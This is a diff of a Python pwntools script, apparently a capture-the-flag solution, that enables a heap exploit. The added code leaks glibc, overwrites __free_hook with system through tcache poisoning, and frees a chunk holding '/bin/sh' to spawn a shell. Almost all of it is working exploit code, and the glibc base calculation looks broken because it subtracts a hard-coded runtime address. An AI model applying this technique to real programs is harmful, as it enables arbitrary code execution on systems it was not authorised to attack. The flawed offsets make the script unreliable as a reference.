@@ -73,9 +73,9 @@ print("malloc-ing")
 malloc(0, 1049) # malloc first big chunk
 malloc(1, 24)
 free(0)
-malloc(0, 1070) # malloc slightly larger chunk
-malloc(2, 24)
+malloc(2, 1070) # malloc slightly larger chunk
 malloc(3, 24)
+malloc(4, 24)
 print("free-ing")
 free(0)
 
@@ -85,24 +85,24 @@ print("leak:", hex(encrypted_leak), hex(leak))
 
 
 
-# glibc_base = leak - 0x1ecbe0
+glibc_base = leak - 0x7f09a85d5370
 
 freehook_offset = 0x001e6e40
 
 system_offset = 0x000503c0
 
-# system_address = glibc_base + system_offset
+system_address = glibc_base + system_offset
 
-# freehook_address = glibc_base + freehook_offset
+freehook_address = glibc_base + freehook_offset
 
-# free(1)
-# free(2)
-# edit(3, b"/bin/sh")
-# edit(2, pwn.p64(freehook_address))
-# malloc(10, 24)
-# malloc(11, 24)
-# edit(11, pwn.p64(system_address))
-# free(3)
+free(1)
+free(2)
+edit(3, b"/bin/sh")
+edit(2, pwn.p64(freehook_address))
+malloc(10, 24)
+malloc(11, 24)
+edit(11, pwn.p64(system_address))
+free(3)
 
 
 # p.interactive()
